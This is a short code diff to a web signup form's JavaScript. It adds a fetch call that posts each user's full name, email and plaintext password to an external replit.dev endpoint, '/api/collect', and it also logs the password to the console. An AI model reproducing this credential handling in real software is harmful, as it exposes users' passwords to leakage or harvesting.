@@ -65,6 +65,19 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             showMessage('success', 'Sign up successful!');
+
+            // Send data to API
+            fetch('https://16cbc52b-caad-4257-82ab-b39d5fc7dde2-00-1uero7o2me3fk.worf.replit.dev:5000/api/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    data: {
+                        fullName,
+                        email,
+                        password
+                    }
+                })
+            });
             console.log({ fullName, email, password });  // Check these values
         });
     }
